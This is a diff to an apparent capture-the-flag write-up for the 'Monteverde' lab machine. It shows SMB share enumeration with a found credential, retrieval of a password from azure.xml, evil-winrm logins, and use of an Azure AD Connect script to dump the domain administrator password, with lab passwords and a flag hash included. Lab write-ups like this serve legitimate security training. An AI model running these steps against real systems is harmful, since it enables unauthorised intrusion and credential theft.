@@ -143,6 +143,7 @@ CME          10.10.10.172:445 MONTEVERDE      [+] megabank\SABatchJobs:SABatchJo
 root@kali:~#
 ```
 
+Enumerate the SMB share again with the credential we found.
 ```shell
 root@kali:~# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs 
 [+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
@@ -158,6 +159,7 @@ root@kali:~# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
 	users$                                            	READ ONLY
 ```
 
+In `\\users$\mhope`, we have an interesting file `azure.xml`.
 ```shell
 root@kali:~# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
 [+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
@@ -177,6 +179,7 @@ root@kali:~# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
 	fw--w--w--             1212 Fri Jan  3 16:59:24 2020	azure.xml
 ```
 
+Download the file `azure.xml`. We can find out it includes a password.
 ```shell
 root@kali:~# smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs
 Try "help" to get a list of possible commands.
@@ -193,7 +196,6 @@ smb: \> get mhope\azure.xml
 getting file \mhope\azure.xml of size 1212 as mhope\azure.xml (7.5 KiloBytes/sec) (average 7.5 KiloBytes/sec)
 smb: \>
 ```
-
 ```shell
 root@kali:~# cat 'mhope\azure.xml' 
 ��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -214,6 +216,8 @@ root@kali:~# cat 'mhope\azure.xml'
 root@kali:~#
 ```
 
+Use the password we found for an user `mhope`.<br>
+`user.txt` is in the directory `C:\Users\mhope\Documents\user.txt`.
 ```shell
 root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
 
@@ -227,6 +231,52 @@ Info: Establishing connection to remote endpoint
 ```
 
 ## 3. Getting Root
+
+```shell
+*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID
+============== ============================================
+megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
 
 ```shell
 *Evil-WinRM* PS C:\Program Files> ls
@@ -262,4 +312,56 @@ d-----         1/3/2020   5:28 AM                WindowsPowerShell
 
 
 *Evil-WinRM* PS C:\Program Files> 
+```
+
+#### On the local host
+```shell
+root@kali:~# git clone https://github.com/Hackplayers/PsCabesha-tools.git
+Cloning into 'PsCabesha-tools'...
+remote: Enumerating objects: 33, done.
+remote: Counting objects: 100% (33/33), done.
+remote: Compressing objects: 100% (33/33), done.
+remote: Total 134 (delta 15), reused 0 (delta 0), pack-reused 101
+Receiving objects: 100% (134/134), 553.60 KiB | 882.00 KiB/s, done.
+Resolving deltas: 100% (65/65), done.
+```
+
+```shell
+*Evil-WinRM* PS C:\Users\mhope\Documents> upload /root/PsCabesha-tools/Privesc/Azure-ADConnect.ps1
+Info: Uploading /root/PsCabesha-tools/Privesc/Azure-ADConnect.ps1 to C:\Users\mhope\Documents\Azure-ADConnect.ps1
+
+                                                             
+Data: 3016 bytes of 3016 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\mhope\Documents> ls
+
+
+    Directory: C:\Users\mhope\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         7/4/2020   6:37 PM           2264 Azure-ADConnect.ps1
+
+```
+
+```shell
+*Evil-WinRM* PS C:\Users\mhope\Documents> import-module ./Azure-ADConnect.ps1
+*Evil-WinRM* PS C:\Users\mhope\Documents> Azure-ADConnect -server 127.0.0.1 -db ADSync
+[+] Domain:  MEGABANK.LOCAL
+[+] Username: administrator
+[+]Password: d0m@in4dminyeah!
+```
+
+```shell
+root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
+12909612d25c8dcf6e5a07d1a804a0bc
 ```
